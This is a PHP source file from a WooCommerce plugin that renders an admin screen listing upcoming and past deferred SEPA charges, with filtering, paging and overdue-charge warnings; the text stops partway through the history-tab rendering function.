<?php
/**
 * WooCommerce → SEPA charges.
 *
 * Two tabs. "Upcoming" is a cash-flow view: charges scheduled but not yet sent.
 * "History" is the record: every charge this plugin has sent, with its dates,
 * its outcome and its Stripe identifier.
 *
 * There is no custom table. Everything is order meta written elsewhere in this
 * plugin, read back through wc_get_orders(), which is what makes the screen
 * work the same on HPOS and on legacy storage.
 *
 * Both tabs let the database do the filtering, sorting and paging. Reading
 * every order the shop has ever taken and sorting them in PHP works until the
 * shop is big, and then stops working with no warning.
 *
 * @package DahuDeferredSepa
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/** Rows per page on the history tab. */
define( 'DAHU_DEFERRED_SEPA_PER_PAGE', 30 );

/** Outcomes a charge can have. */
define( 'DAHU_DEFERRED_SEPA_RESULTS', array( 'processing', 'succeeded', 'failed', 'disputed' ) );

add_action( 'admin_menu', 'dahu_deferred_sepa_register_admin_page', 20 );

/**
 * Adds the screen under WooCommerce.
 *
 * @return void
 */
function dahu_deferred_sepa_register_admin_page() {
	add_submenu_page(
		'woocommerce',
		__( 'SEPA charges', 'dahu-deferred-sepa' ),
		__( 'SEPA charges', 'dahu-deferred-sepa' ),
		'edit_shop_orders',
		DAHU_DEFERRED_SEPA_CHARGES_PAGE,
		'dahu_deferred_sepa_render_admin_page'
	);
}

/**
 * A readable label for an outcome.
 *
 * @param string $result Outcome.
 * @return string
 */
function dahu_deferred_sepa_result_label( $result ) {
	$labels = array(
		'processing' => __( 'Under way', 'dahu-deferred-sepa' ),
		'succeeded'  => __( 'Collected', 'dahu-deferred-sepa' ),
		'failed'     => __( 'Failed', 'dahu-deferred-sepa' ),
		'disputed'   => __( 'Disputed', 'dahu-deferred-sepa' ),
	);

	return isset( $labels[ $result ] ) ? $labels[ $result ] : $result;
}

/**
 * An outcome as a coloured badge.
 *
 * @param string $result Outcome.
 * @return string HTML.
 */
function dahu_deferred_sepa_result_badge( $result ) {
	return '<span class="dahu-sepa-badge dahu-sepa-badge--' . esc_attr( $result ) . '">'
		. esc_html( dahu_deferred_sepa_result_label( $result ) )
		. '</span>';
}

/**
 * Adds working days to a timestamp, for estimating when money lands.
 *
 * @param int $timestamp Starting point.
 * @param int $days      Working days to add.
 * @return int
 */
function dahu_deferred_sepa_add_business_days( $timestamp, $days ) {
	while ( $days > 0 ) {
		$timestamp += DAY_IN_SECONDS;

		if ( (int) wp_date( 'N', $timestamp ) < 6 ) {
			--$days;
		}
	}

	return $timestamp;
}

/**
 * How many working days SEPA is assumed to take to settle.
 *
 * It cannot be known from WooCommerce, so it is an estimate, and the screen
 * says so rather than presenting it as a fact.
 *
 * @return int
 */
function dahu_deferred_sepa_settlement_days() {
	/**
	 * Filters the assumed SEPA settlement time, in working days.
	 *
	 * @param int $days Working days.
	 */
	return max( 0, (int) apply_filters( 'dahu_deferred_sepa_settlement_days', 3 ) );
}

/* ------------------------------------------------------------------
 * The screen
 * ------------------------------------------------------------------ */

/**
 * Renders the screen and its tabs.
 *
 * @return void
 */
function dahu_deferred_sepa_render_admin_page() {
	if ( ! current_user_can( 'edit_shop_orders' ) ) {
		wp_die( esc_html__( 'You are not allowed to view this page.', 'dahu-deferred-sepa' ), '', array( 'response' => 403 ) );
	}

	// The family sheet first, and its own second: the plugin's own rules
	// are written to sit on top of the shared components, so the order is
	// a dependency and not a hope. One handle across the family -- the
	// file is byte-identical everywhere, so whichever plugin loads it
	// first serves all of them, and a shop with six of these installed
	// downloads one copy.
	wp_enqueue_style(
		'dahu-ui',
		DAHU_DEFERRED_SEPA_URL . 'assets/css/dahu-ui.css',
		array(),
		DAHU_DEFERRED_SEPA_VERSION
	);

	wp_enqueue_style(
		'dahu-deferred-sepa-admin',
		DAHU_DEFERRED_SEPA_URL . 'assets/css/admin.css',
		array( 'dahu-ui' ),
		DAHU_DEFERRED_SEPA_VERSION
	);

	// phpcs:ignore WordPress.Security.NonceVerification.Recommended -- navigation between two read-only tabs.
	$current = isset( $_GET['tab'] ) && 'history' === $_GET['tab'] ? 'history' : 'upcoming';

	$tabs = array(
		'upcoming' => __( 'Upcoming', 'dahu-deferred-sepa' ),
		'history'  => __( 'History', 'dahu-deferred-sepa' ),
	);

	echo '<div class="wrap dahu-ui">';
	echo '<div class="dahu-ui-head">';
	echo '<h1 class="dahu-ui-head__title">' . esc_html__( 'SEPA charges', 'dahu-deferred-sepa' ) . '</h1>';
	echo '<p class="dahu-ui-head__sub">' . esc_html__( 'What is due, and what has been taken.', 'dahu-deferred-sepa' ) . '</p>';
	echo '</div>';

	echo '<hr class="wp-header-end">';
	echo '<h2 class="nav-tab-wrapper">';

	foreach ( $tabs as $slug => $label ) {
		printf(
			'<a href="%s" class="nav-tab%s">%s</a>',
			esc_url( admin_url( 'admin.php?page=' . DAHU_DEFERRED_SEPA_CHARGES_PAGE . '&tab=' . $slug ) ),
			$slug === $current ? ' nav-tab-active' : '',
			esc_html( $label )
		);
	}

	echo '</h2>';

	if ( 'upcoming' === $current ) {
		dahu_deferred_sepa_render_upcoming_tab();
	} else {
		dahu_deferred_sepa_render_history_tab();
	}

	echo '</div>';
}

/* ------------------------------------------------------------------
 * Upcoming
 * ------------------------------------------------------------------ */

/**
 * Charges scheduled but not yet sent.
 *
 * Bounded by what is actually pending, which is a small set by definition: a
 * charge leaves this list as soon as it is sent.
 *
 * @return void
 */
/**
 * The charges that were due and never ran, at the top of the screen.
 *
 * Its own block, above everything, and in the one band of the screen: this is money
 * the shop has not been paid for goods it has already sent, and it is the
 * only thing on this screen that needs doing today.
 *
 * No settlement estimate, no total mixed with the pending ones, and the
 * reason read now rather than the reason recorded then — "no approved
 * mandate" is put right on a profile in a minute, and the alternative is a
 * shop opening Stripe to look for a payment that was never sent.
 *
 * Nothing here charges, retries or reschedules. A charge that may or may not
 * have gone is not one to send again from a button that says "fix": the
 * order is linked, and the decision is a person's.
 *
 * @param WC_Order[] $late Overdue orders, keyed by id.
 * @return void
 */
function dahu_deferred_sepa_render_overdue_block( array $late ) {

	if ( ! $late ) {
		return;
	}

	echo '<div class="dahu-ui-band"><div><p class="dahu-ui-band__title">';

	printf(
		/* translators: %d: number of orders. */
		esc_html(
			_n(
				'%d charge was due and never ran.',
				'%d charges were due and never ran.',
				count( $late ),
				'dahu-deferred-sepa'
			)
		),
		count( $late )
	);

	echo '</p><p class="dahu-ui-band__text">';

	esc_html_e( 'No money moved on these orders and nothing is retried automatically, because a charge that may already have been sent would be taken twice. Check each one, then reschedule it from the order.', 'dahu-deferred-sepa' );

	echo '</p></div></div>';

	echo '<table class="dahu-ui-table"><thead><tr>';
	echo '<th>' . esc_html__( 'Order', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Amount', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Was due', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'What is in the way', 'dahu-deferred-sepa' ) . '</th>';
	echo '</tr></thead><tbody>';

	foreach ( $late as $order ) {

		$reason = dahu_deferred_sepa_blocking_reason( $order );

		echo '<tr>';
		echo '<td><a href="' . esc_url( $order->get_edit_order_url() ) . '"><strong>#'
			. esc_html( $order->get_order_number() ) . '</strong></a></td>';
		echo '<td>' . wp_kses_post( wc_price( $order->get_total(), array( 'currency' => $order->get_currency() ) ) ) . '</td>';
		echo '<td>' . esc_html( dahu_deferred_sepa_format_date( (int) $order->get_meta( '_dahu_deferred_sepa_scheduled_ts' ) ) ) . '</td>';
		echo '<td>' . esc_html(
			'' !== $reason
				? $reason
				// Nothing visibly wrong with the order, so the charge was
				// never run at all. Said plainly, because it points
				// somewhere completely different: at the queue, not at the
				// customer's mandate.
				: __( 'Nothing is wrong with this order: the scheduled job was lost, or the queue is not running.', 'dahu-deferred-sepa' )
		) . '</td>';
		echo '</tr>';
	}

	echo '</tbody></table>';

	$swept = dahu_deferred_sepa_last_sweep();

	echo '<p>';

	if ( $swept ) {
		printf(
			/* translators: %s: date and time. */
			esc_html__( 'The daily check last reported overdue charges on %s. Each order is reported once, by email, and then stays on this list until it is dealt with.', 'dahu-deferred-sepa' ),
			esc_html( dahu_deferred_sepa_format_date( $swept ) )
		);
	} else {
		// Said, and not left blank. A watchdog nobody has ever heard from is
		// either a shop that has never been late or a watchdog that is not
		// running, and those two want different actions.
		esc_html_e( 'The daily check has not reported anything yet. If these orders have been here since before today, the check may not be running: look at WooCommerce, Status, Scheduled Actions.', 'dahu-deferred-sepa' );
	}

	echo '</p>';
}

function dahu_deferred_sepa_render_upcoming_tab() {
	// phpcs:ignore WordPress.Security.NonceVerification.Recommended -- a read-only display toggle.
	$show_pending = ! empty( $_GET['show_pending'] );

	$rows = array();

	$scheduled = wc_get_orders(
		array(
			'limit'        => -1,
			'meta_key'     => '_dahu_deferred_sepa_scheduled_ts', // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_meta_key -- wc_get_orders' own argument.
			'meta_compare' => 'EXISTS',
		)
	);

	$late = array();

	foreach ( $scheduled as $order ) {
		$when = (int) $order->get_meta( '_dahu_deferred_sepa_scheduled_ts' );

		if ( ! $when || 'yes' === $order->get_meta( '_dahu_deferred_sepa_done' ) ) {
			continue;
		}

		// Settled another way: not pending, not late, not expected cash. It
		// keeps its own record on the order and in the history, and showing
		// it here would make the total at the top of this screen a figure the
		// shop is waiting for twice.
		if ( dahu_deferred_sepa_is_settled_offline( $order ) ) {
			continue;
		}

		// A charge whose date has passed and which never ran is not
		// "upcoming", and showing it here with a settlement estimate is the
		// worst thing this screen can do: it tells a shop money is on its
		// way when nothing was ever sent, and it goes on telling it every
		// day. Those orders are taken out of the list below and put in
		// their own block at the top. See includes/alerts.php.
		if ( dahu_deferred_sepa_is_overdue( $order ) ) {
			$late[ $order->get_id() ] = $order;

			continue;
		}

		$rows[ $order->get_id() ] = array(
			'order' => $order,
			'when'  => $when,
		);
	}

	dahu_deferred_sepa_render_overdue_block( $late );

	if ( $show_pending ) {
		$pending = wc_get_orders(
			array(
				'limit'          => -1,
				'status'         => array( 'on-hold', 'processing' ),
				'payment_method' => DAHU_DEFERRED_SEPA_GATEWAY_ID,
			)
		);

		foreach ( $pending as $order ) {
			if ( isset( $rows[ $order->get_id() ] ) || 'yes' === $order->get_meta( '_dahu_deferred_sepa_done' ) ) {
				continue;
			}

			// Not scheduled yet: the clock starts when the order is completed.
			$rows[ $order->get_id() ] = array(
				'order' => $order,
				'when'  => 0,
			);
		}
	}

	// Scheduled first, soonest to latest, then the unscheduled ones.
	uasort(
		$rows,
		static function ( $a, $b ) {
			if ( $a['when'] && $b['when'] ) {
				return $a['when'] <=> $b['when'];
			}

			if ( $a['when'] ) {
				return -1;
			}

			if ( $b['when'] ) {
				return 1;
			}

			return $b['order']->get_id() <=> $a['order']->get_id();
		}
	);

	// Totalled per currency. Adding a dollar order into a euro total would
	// present a figure the shop would act on and that means nothing — and an
	// order in another currency is one this plugin can never charge at all.
	$totals = array();

	foreach ( $rows as $row ) {
		$currency = $row['order']->get_currency();

		$totals[ $currency ] = ( $totals[ $currency ] ?? 0.0 ) + (float) $row['order']->get_total();
	}

	$amounts = array();

	foreach ( $totals as $currency => $amount ) {
		$amounts[] = wc_price( $amount, array( 'currency' => $currency ) );
	}

	echo '<div class="dahu-ui-card">';
	echo '<div class="dahu-sepa-note">';
	printf(
		/* translators: 1: one or more total amounts, already formatted; 2: number of orders. */
		esc_html__( 'Expected: %1$s across %2$d orders.', 'dahu-deferred-sepa' ),
		wp_kses_post( $amounts ? implode( ' + ', $amounts ) : wc_price( 0 ) ),
		count( $rows )
	);
	echo '</div>';

	echo '<form method="get">';
	echo '<input type="hidden" name="page" value="' . esc_attr( DAHU_DEFERRED_SEPA_CHARGES_PAGE ) . '">';
	echo '<input type="hidden" name="tab" value="upcoming">';
	echo '<p><label><input type="checkbox" name="show_pending" value="1" ' . checked( $show_pending, true, false ) . '> '
		. esc_html__( 'Also show orders taken on this gateway that have not shipped yet', 'dahu-deferred-sepa' )
		. '</label> <button class="dahu-ui-btn">' . esc_html__( 'Apply', 'dahu-deferred-sepa' ) . '</button></p>';
	echo '</form>';

	echo '<p class="description">';
	printf(
		/* translators: %d: assumed settlement time in working days. */
		esc_html__( 'The settlement date is an estimate: it assumes %d working days after the charge is sent, which WooCommerce cannot verify.', 'dahu-deferred-sepa' ),
		(int) dahu_deferred_sepa_settlement_days()
	);

	if ( $show_pending ) {
		echo ' ' . esc_html__( 'Orders that have not shipped have no date yet — their delay starts when the order is marked Completed.', 'dahu-deferred-sepa' );
	}

	echo '</p>';
	echo '</div>';

	if ( ! $rows ) {
		// Three different nothings, and only one of them is this one. "No
		// charge has been sent yet" belongs to the History tab; "no charge
		// matched what you asked for" belongs to its filters. Here the shop
		// has simply not got a deferred order waiting, so the sentence says
		// what will land here rather than leaving an empty card that reads
		// like a screen that failed to load.
		echo '<div class="dahu-ui-card">';
		echo '<p class="dahu-ui-hint">'
			. esc_html__( 'Nothing is due: an order paid with this gateway appears here as soon as it is marked Completed.', 'dahu-deferred-sepa' )
			. '</p>';
		echo '</div>';

		return;
	}

	echo '<div class="dahu-ui-card">';
	echo '<table class="widefat striped dahu-sepa-charges__table"><thead><tr>';
	echo '<th>' . esc_html__( 'Order', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Ordered', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Amount', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Delay', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Charge sent', 'dahu-deferred-sepa' ) . '</th>';
	echo '<th>' . esc_html__( 'Settled (estimate)', 'dahu-deferred-sepa' ) . '</th>';
	echo '</tr></thead><tbody>';

	foreach ( $rows as $row ) {
		$order   = $row['order'];
		$delay   = dahu_deferred_sepa_get_delay_days( $order->get_user_id() );
		$created = $order->get_date_created();

		echo '<tr>';
		echo '<td><a href="' . esc_url( $order->get_edit_order_url() ) . '"><strong>#'
			. esc_html( $order->get_order_number() ) . '</strong></a><br><span class="description">'
			. esc_html( wc_get_order_status_name( $order->get_status() ) ) . '</span></td>';
		echo '<td>' . esc_html( $created ? $created->date_i18n( get_option( 'date_format' ) ) : '—' ) . '</td>';
		echo '<td>' . wp_kses_post( wc_price( $order->get_total(), array( 'currency' => $order->get_currency() ) ) ) . '</td>';
		echo '<td>' . esc_html( sprintf( /* translators: %d: days. */ _n( '%d day', '%d days', $delay, 'dahu-deferred-sepa' ), $delay ) ) . '</td>';

		if ( $row['when'] ) {
			$settled = dahu_deferred_sepa_add_business_days( $row['when'], dahu_deferred_sepa_settlement_days() );

			echo '<td>' . esc_html( dahu_deferred_sepa_format_date( $row['when'] ) ) . '</td>';
			echo '<td><strong>' . esc_html( dahu_deferred_sepa_format_day( $settled ) ) . '</strong></td>';
		} else {
			echo '<td><em>' . esc_html__( 'when the order is completed', 'dahu-deferred-sepa' ) . '</em></td>';
			echo '<td><em>—</em></td>';
		}

		echo '</tr>';
	}

	echo '</tbody></table>';
	echo '</div>';
}

/* ------------------------------------------------------------------
 * History
 * ------------------------------------------------------------------ */

/**
 * The filters in the URL. Shared by the screen and the CSV export, so an export
 * always matches what was on screen.
 *
 * @return array{from:string,to:string,result:string,orderby:string,order:string}
 */
function dahu_deferred_sepa_history_request_args() {
	// phpcs:disable WordPress.Security.NonceVerification.Recommended -- read-only filters.
	$orderby = isset( $_REQUEST['orderby'] ) ? sanitize_key( wp_unslash( $_REQUEST['orderby'] ) ) : 'executed';
	$order   = isset( $_REQUEST['order'] ) && 'asc' === strtolower( sanitize_key( wp_unslash( $_REQUEST['order'] ) ) ) ? 'asc' : 'desc';
	$result  = isset( $_REQUEST['dahu_result'] ) ? sanitize_key( wp_unslash( $_REQUEST['dahu_result'] ) ) : '';

	$args = array(
		'from'    => isset( $_REQUEST['dahu_from'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['dahu_from'] ) ) : '',
		'to'      => isset( $_REQUEST['dahu_to'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['dahu_to'] ) ) : '',
		'result'  => in_array( $result, DAHU_DEFERRED_SEPA_RESULTS, true ) ? $result : '',
		// 'total' is not offered: see the note above dahu_deferred_sepa_history_query().
		'orderby' => in_array( $orderby, array( 'executed', 'number' ), true ) ? $orderby : 'executed',
		'order'   => $order,
	);
	// phpcs:enable WordPress.Security.NonceVerification.Recommended

	// A date that is not a date is dropped rather than passed to the query.
	foreach ( array( 'from', 'to' ) as $key ) {
		if ( '' !== $args[ $key ] && ! dahu_deferred_sepa_is_ymd( $args[ $key ] ) ) {
			$args[ $key ] = '';
		}
	}

	return $args;
}

/**
 * Whether a string is a calendar date in Y-m-d form.
 *
 * @param string $value Value.
 * @return bool
 */
function dahu_deferred_sepa_is_ymd( $value ) {
	$date = DateTime::createFromFormat( 'Y-m-d', $value );

	return $date && $date->format( 'Y-m-d' ) === $value;
}

/*
 * Why the queries below look the way they do.
 *
 * `wc_get_orders()` accepts a lot of arguments, and QUIETLY IGNORES several of
 * them on legacy order storage. Measured on this bench, WooCommerce 11.1 with
 * HPOS off:
 *
 * - `meta_query` (any shape, any comparison) — ignored. Every order comes back,
 *   so a screen built on it looks filtered and is not.
 * - `include` and `id` — ignored. Orders outside the set come back.
 * - `orderby => 'total'` combined with a `meta_key`/`meta_compare` bound — the
 *   META BOUND is dropped, so orders that were never charged appear.
 * - `post__in` — works, but it is a WP_Query argument and cannot be relied on
 *   once HPOS is on.
 *
 * What does work on both storages is the single meta trio — `meta_key` with
 * `meta_value` / `meta_compare` / `meta_type` — plus `orderby` of
 * `meta_value_num` or `ID`, plus `limit` and `paged`.
 *
 * So: one trio per condition, each asking only for ids, intersected in PHP.
 * Ids are integers and cheap; it is hydrating orders that is not. The page
 * being looked at is the only thing turned into order objects.
 *
 * The unfiltered view — what the screen shows when it is opened — skips the
 * intersection entirely and is paged by the database.
 *
 * The amount column is deliberately NOT sortable. It would need
 * `orderby => 'total'`, which drops the meta bound and would list uncharged
 * orders among the charges. A sort that is wrong on one storage is worse than
 * no sort, and the CSV export answers "which were the biggest" properly.
 */

/**
 * The query that bounds and orders the set: charges actually sent, on this
 * gateway.
 *
 * @param array $args     Filters.
 * @param int   $page     Page number, or 0 for no paging.
 * @param int   $per_page Rows per page.
 * @return array wc_get_orders() arguments.
 */
function dahu_deferred_sepa_history_query( $args, $page = 1, $per_page = DAHU_DEFERRED_SEPA_PER_PAGE ) {
	// Bounded on there having BEEN a charge, not on the gateway id. This
	// plugin also charges orders taken on the official Stripe SEPA gateways
	// (DAHU_DEFERRED_SEPA_GATEWAYS), and restricting to its own id left those
	// charges out of the history and out of the CSV while the Upcoming tab
	// still listed them — the two tabs disagreeing about the same order.
	// `_dahu_deferred_sepa_executed_ts` is written by nothing else.
	$query = array(
		'status'       => array_keys( wc_get_order_statuses() ),
		'meta_key'     => '_dahu_deferred_sepa_executed_ts', // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_meta_key -- wc_get_orders' own argument; the key is this plugin's.
		'meta_compare' => 'EXISTS',
		'order'        => 'asc' === $args['order'] ? 'ASC' : 'DESC',
		'orderby'      => 'number' === $args['orderby'] ? 'ID' : 'meta_value_num',
	);

	if ( $page > 0 ) {
		$query['limit'] = $per_page;
		$query['paged'] = $page;
	} else {
		$query['limit'] = -1;
	}

	return $query;
}

/**
 * Whether the filters narrow the set at all.
 *
 * @param array $args Filters.
 * @return bool
 */
function dahu_deferred_sepa_history_is_filtered( $args ) {
	return '' !== $args['result'] || '' !== $args['from'] || '' !== $args['to'];
}

/**
 * The first or last instant of a calendar day, as a UTC timestamp.
 *
 * The stored timestamps are UTC epochs, but every date on the screen is
 * rendered in the site's timezone, and the filter has to agree with what the
 * reader sees. strtotime() would use PHP's default timezone, which WordPress
 * forces to UTC, so a charge sent at 01:30 in Paris — 23:30 UTC the day before
 * — would be shown under one day and filtered under another, and a month-end
 * export would be short by the rows in the first few hours.
 *
 * @param string $ymd   Date, as Y-m-d.
 * @param string $which 'start' or 'end'.
 * @return int
 */
function dahu_deferred_sepa_day_bound( $ymd, $which ) {
	$time = 'end' === $which ? '23:59:59' : '00:00:00';
	$when = DateTimeImmutable::createFromFormat( 'Y-m-d H:i:s', $ymd . ' ' . $time, wp_timezone() );

	return $when ? $when->getTimestamp() : 0;
}

/**
 * The ids matching one meta condition, or null when the condition is not set.
 *
 * @param string $key     Meta key.
 * @param mixed  $value   Value.
 * @param string $compare Comparison.
 * @param string $type    Meta type, for a numeric comparison.
 * @return int[]|null
 */
function dahu_deferred_sepa_ids_where( $key, $value, $compare = '=', $type = '' ) {
	$query = array(
		'limit'        => -1,
		'return'       => 'ids',
		'status'       => array_keys( wc_get_order_statuses() ),
		'meta_key'     => $key, // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_meta_key -- as above.
		'meta_value'   => $value, // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_meta_value -- as above.
		'meta_compare' => $compare,
	);

	if ( $type ) {
		$query['meta_type'] = $type;
	}

	return array_map( 'intval', (array) wc_get_orders( $query ) );
}

/**
 * The ids of every charge matching the filters, in the right order.
 *
 * array_intersect keeps the first array's order, which is what makes the
 * ordering survive the intersection.
 *
 * @param array $args Filters.
 * @return int[]
 */
function dahu_deferred_sepa_history_ids( $args ) {
	$ordered = array_map( 'intval', (array) wc_get_orders( dahu_deferred_sepa_history_query( $args, 0 ) + array( 'return' => 'ids' ) ) );

	if ( ! dahu_deferred_sepa_history_is_filtered( $args ) ) {
		return $ordered;
	}

	$sets = array();

	if ( '' !== $args['result'] ) {
		$sets[] = dahu_deferred_sepa_ids_where( '_dahu_deferred_sepa_result', $args['result'] );
	}

	if ( '' !== $args['from'] ) {
		$sets[] = dahu_deferred_sepa_ids_where(
			'_dahu_deferred_sepa_executed_ts',
			dahu_deferred_sepa_day_bound( $args['from'], 'start' ),
			'>=',
			'NUMERIC'
		);
	}

	if ( '' !== $args['to'] ) {
		$sets[] = dahu_deferred_sepa_ids_where(
			'_dahu_deferred_sepa_executed_ts',
			dahu_deferred_sepa_day_bound( $args['to'], 'end' ),
			'<=',
			'NUMERIC'
		);
	}

	foreach ( $sets as $set ) {
		$ordered = array_intersect( $ordered, $set );

		if ( ! $ordered ) {
			return array();
		}
	}

	return array_values( $ordered );
}

/**
 * How many charges match the filters.
 *
 * @param array $args Filters.
 * @return int
 */
function dahu_deferred_sepa_history_count( $args ) {
	return count( dahu_deferred_sepa_history_ids( $args ) );
}

/**
 * One history row, from an order.
 *
 * @param WC_Order $order Order.
 * @return array
 */
function dahu_deferred_sepa_history_row( WC_Order $order ) {
	return array(
		'order'      => $order,
		'number'     => $order->get_order_number(),
		'customer'   => trim( $order->get_formatted_billing_full_name() ),
		'email'      => $order->get_billing_email(),
		'total'      => (float) $order->get_total(),
		'currency'   => $order->get_currency(),
		'first_ts'   => (int) $order->get_meta( '_dahu_deferred_sepa_first_scheduled_ts' ),
		'final_ts'   => (int) $order->get_meta( '_dahu_deferred_sepa_final_scheduled_ts' ),
		'reschedule' => (int) $order->get_meta( '_dahu_deferred_sepa_reschedule_count' ),
		'executed'   => (int) $order->get_meta( '_dahu_deferred_sepa_executed_ts' ),
		'result'     => (string) $order->get_meta( '_dahu_deferred_sepa_result' ),
		'intent'     => (string) $order->get_meta( '_stripe_intent_id' ),
	);
}

/**
 * The history rows for one page.
 *
 * The unfiltered view — what the screen shows when it is opened — is paged by
 * the database and never builds an id list. A filtered view intersects the id
 * sets and then hydrates only the page being looked at.
 *
 * @param array $args     Filters.
 * @param int   $page     Page number, or 0 for everything.
 * @param int   $per_page Rows per page.
 * @return array[]
 */
function dahu_deferred_sepa_get_history_rows( $args, $page = 1, $per_page = DAHU_DEFERRED_SEPA_PER_PAGE ) {
	// Paged from the ordered id list rather than by the database, even with no
	// filter applied. `_dahu_deferred_sepa_executed_ts` has second resolution
	// and Action Scheduler sends a batch of due charges within the same second,
	// so ties are routine — and an ORDER BY with no tie-breaker lets the page-1
	// and page-2 queries disagree, showing one row twice and never showing
	// another. wc_get_orders() offers no secondary sort, so the ordering is
	// settled once here and then sliced.
	$ids = dahu_deferred_sepa_history_ids( $args );

	if ( $page > 0 ) {
		$ids = array_slice( $ids, ( $page - 1 ) * $per_page, $per_page );
	}

	$orders = array();

	foreach ( $ids as $id ) {
		$order = wc_get_order( $id );

		if ( $order ) {
			$orders[] = $order;
		}
	}

	$rows = array();

	foreach ( $orders as $order ) {
		$rows[] = dahu_deferred_sepa_history_row( $order );
	}

	return $rows;
}

/**
 * The history list table. Declared on demand, because WP_List_Table is not
 * loaded on every admin screen.
 *
 * @return WP_List_Table
 */
function dahu_deferred_sepa_history_table() {
	if ( ! class_exists( 'WP_List_Table' ) ) {
		require_once ABSPATH . 'wp-admin/includes/class-wp-list-table.php';
	}

	if ( ! class_exists( 'Dahu_Deferred_SEPA_History_Table' ) ) {

		/**
		 * Charges already sent.
		 */
		class Dahu_Deferred_SEPA_History_Table extends WP_List_Table {

			/**
			 * Sets the table up.
			 */
			public function __construct() {
				parent::__construct(
					array(
						'singular' => 'charge',
						'plural'   => 'charges',
						'ajax'     => false,
					)
				);
			}

			/**
			 * Columns.
			 *
			 * @return array<string,string>
			 */
			public function get_columns() {
				return array(
					'number'   => __( 'Order', 'dahu-deferred-sepa' ),
					'customer' => __( 'Customer', 'dahu-deferred-sepa' ),
					'total'    => __( 'Amount', 'dahu-deferred-sepa' ),
					'first'    => __( 'First due', 'dahu-deferred-sepa' ),
					'final'    => __( 'Finally due', 'dahu-deferred-sepa' ),
					'executed' => __( 'Sent', 'dahu-deferred-sepa' ),
					'result'   => __( 'Outcome', 'dahu-deferred-sepa' ),
					'intent'   => __( 'PaymentIntent', 'dahu-deferred-sepa' ),
				);
			}

			/**
			 * Sortable columns.
			 *
			 * @return array<string,array>
			 */
			public function get_sortable_columns() {
				// No 'total': ordering by amount cannot keep the meta bound on
				// legacy order storage, and would list orders never charged.
				return array(
					'number'   => array( 'number', false ),
					'executed' => array( 'executed', true ),
				);
			}

			/**
			 * Loads the page being looked at.
			 *
			 * @return void
			 */
			public function prepare_items() {
				$args     = dahu_deferred_sepa_history_request_args();
				$per_page = DAHU_DEFERRED_SEPA_PER_PAGE;
				$total    = dahu_deferred_sepa_history_count( $args );
				$pages    = max( 1, (int) ceil( $total / $per_page ) );

				$this->set_pagination_args(
					array(
						'total_items' => $total,
						'per_page'    => $per_page,
						'total_pages' => $pages,
					)
				);

				// Read after set_pagination_args(), which is what clamps it: a
				// ?paged= beyond the end would otherwise render an empty table
				// saying nothing matched.
				$page = min( $this->get_pagenum(), $pages );

				$this->_column_headers = array( $this->get_columns(), array(), $this->get_sortable_columns() );
				$this->items           = dahu_deferred_sepa_get_history_rows( $args, $page, $per_page );
			}

			/**
			 * Empty-state message.
			 *
			 * @return void
			 */
			public function no_items() {
				// A fresh install has no history and no filters either, and
				// blaming filters nobody set is what makes a new screen look
				// broken. dahu_deferred_sepa_history_is_filtered() is the
				// same predicate the query uses to decide whether to
				// intersect id sets, so the message and the query can never
				// disagree about what counts as a filter.
				if ( dahu_deferred_sepa_history_is_filtered( dahu_deferred_sepa_history_request_args() ) ) {
					esc_html_e( 'No charges match these filters.', 'dahu-deferred-sepa' );

					return;
				}

				esc_html_e( 'No charge has been sent yet: every charge this gateway takes is listed here.', 'dahu-deferred-sepa' );
			}

			/**
			 * One cell.
			 *
			 * @param array  $item        Row.
			 * @param string $column_name Column.
			 * @return string
			 */
			public function column_default( $item, $column_name ) {
				switch ( $column_name ) {
					case 'number':
						return '<a href="' . esc_url( $item['order']->get_edit_order_url() ) . '"><strong>#'
							. esc_html( $item['number'] ) . '</strong></a>';

					case 'customer':
						// One dash, not two stacked. An order with neither a
						// billing name nor an email rendered as "— / —", which
						// is noise where a single mark says the same thing.
						if ( ! $item['customer'] && ! $item['email'] ) {
							return '—';
						}

						if ( ! $item['customer'] ) {
							return esc_html( $item['email'] );
						}

						$out = esc_html( $item['customer'] );

						if ( $item['email'] ) {
							$out .= '<br><span class="description">' . esc_html( $item['email'] ) . '</span>';
						}

						return $out;

					case 'total':
						return wp_kses_post( wc_price( $item['total'], array( 'currency' => $item['currency'] ) ) );

					case 'first':
						return $item['first_ts'] ? esc_html( dahu_deferred_sepa_format_date( $item['first_ts'] ) ) : '—';

					case 'final':
						if ( ! $item['final_ts'] ) {
							return '—';
						}

						$out = esc_html( dahu_deferred_sepa_format_date( $item['final_ts'] ) );

						if ( $item['reschedule'] ) {
							$out .= '<br><span class="description">' . esc_html(
								sprintf(
									/* translators: %d: how many times the charge was moved. */
									_n( 'moved once', 'moved %d times', $item['reschedule'], 'dahu-deferred-sepa' ),
									$item['reschedule']
								)
							) . '</span>';
						}

						return $out;

					case 'executed':
						return $item['executed'] ? esc_html( dahu_deferred_sepa_format_date( $item['executed'] ) ) : '—';

					case 'result':
						return $item['result'] ? dahu_deferred_sepa_result_badge( $item['result'] ) : '—';

					case 'intent':
						return $item['intent'] ? '<code>' . esc_html( $item['intent'] ) . '</code>' : '—';
				}

				return '';
			}
		}
	}

	return new Dahu_Deferred_SEPA_History_Table();
}

/**
 * The history tab: filters, table, export.
 *
 * @return void
 */
function dahu_deferred_sepa_render_history_tab() {
	$args  = dahu_deferred_sepa_history_request_args();
	$table = dahu_deferred_sepa_history_table();

	$table->prepare_items();

	$export_url = wp_nonce_url(
		add_query_arg(
			array(
				'action'      => 'dahu_deferred_sepa_export_history',
				'dahu_from'   => $args['from'],
				'dahu_to'     => $args['to'],
				'dahu_result' => $args['result'],
				'orderby'     => $args['orderby'],
				'order'       => $args['order'],
			),
			admin_url( 'admin-post.php' )
